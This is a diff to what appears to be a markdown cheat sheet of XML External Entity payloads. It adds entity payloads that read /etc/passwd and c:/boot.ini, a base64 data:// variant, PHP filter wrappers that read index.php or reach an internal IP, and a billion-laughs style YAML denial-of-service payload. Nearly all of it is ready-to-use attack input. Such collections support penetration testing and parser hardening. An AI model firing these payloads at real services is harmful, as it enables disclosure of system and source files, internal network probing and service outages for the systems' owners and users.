@@ -13,6 +13,7 @@ Basic Test
  </userInfo>
 ```
 
+## Basic XXE
 Classic XXE
 ```
 <?xml version="1.0"?>
@@ -23,12 +24,27 @@ Classic XXE
 <data>&file;</data>
 ```
 
-Classic XXE Base64 encoded
 ```
-<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,PCFF...Cg=="> %init; ]><foo/>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-PHP Wrapper inside XXE
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+```
+
+
+Classic XXE Base64 encoded
+```
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+```
+
+## PHP Wrapper inside XXE
 ```
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <contacts>
@@ -42,7 +58,17 @@ PHP Wrapper inside XXE
 </contacts>
 ```
 
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" >
+]>
+<foo>&xxe;</foo>
+```
 
+
+## Deny of service
 Deny Of Service - Billion Laugh Attack
 ```
 <!DOCTYPE data [
@@ -55,6 +81,20 @@ Deny Of Service - Billion Laugh Attack
 <data>&a4;</data>
 ```
 
+Yaml attack
+```
+a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+```
+
+## Blind XXE
 Blind XXE
 ```
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -103,6 +143,7 @@ XXE Inside SOAP
 
 
 ## Thanks to
-* https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
-* http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html
-* https://gist.github.com/staaldraad/01415b990939494879b4
+ * https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+ * http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html
+ * https://gist.github.com/staaldraad/01415b990939494879b4
+ * https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870
